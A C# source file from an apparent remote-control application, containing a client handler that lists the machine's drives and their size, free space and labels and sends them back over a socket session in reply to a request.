using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using RemoteControl.Protocals;
using Microsoft.Win32;
using RemoteControl.Protocals.Response;
using RemoteControl.Protocals.Request;
using System.Windows.Forms;
using RemoteControl.Protocals.Utilities;

namespace RemoteControl.Client.Handlers
{
    class RequestGetDrivesHandler : IRequestHandler
    {
        public void Handle(SocketSession session, ePacketType reqType, object reqObj)
        {
            if (reqType == ePacketType.PACKET_GET_DRIVES_EX_REQUEST)
            {
                HandleGetDrivesEx(session);
                return;
            }

            var resp = new ResponseGetDrives();
            try
            {
                resp.drives = Environment.GetLogicalDrives().ToList();
            }
            catch (Exception ex)
            {
                resp.Result = false;
                resp.Message = ex.ToString();
                resp.Detail = ex.StackTrace.ToString();
            }

            session.Send(ePacketType.PACKET_GET_DRIVES_RESPONSE, resp);
        }

        private void HandleGetDrivesEx(SocketSession session)
        {
            var resp = new ResponseGetDrivesEx();
            resp.Drives = new List<DriveInfoEx>();

            try
            {
                foreach (DriveInfo drive in DriveInfo.GetDrives())
                {
                    var item = new DriveInfoEx();
                    item.Name = drive.Name;
                    item.DriveType = drive.DriveType.ToString();

                    if (drive.IsReady)
                    {
                        item.TotalSize = drive.TotalSize;
                        item.FreeSpace = drive.AvailableFreeSpace;
                        item.VolumeLabel = drive.VolumeLabel;
                    }

                    resp.Drives.Add(item);
                }
            }
            catch (Exception ex)
            {
                resp.Result = false;
                resp.Message = ex.ToString();
                resp.Detail = ex.StackTrace == null ? string.Empty : ex.StackTrace.ToString();
            }

            session.Send(ePacketType.PACKET_GET_DRIVES_EX_RESPONSE, resp);
        }
    }
}
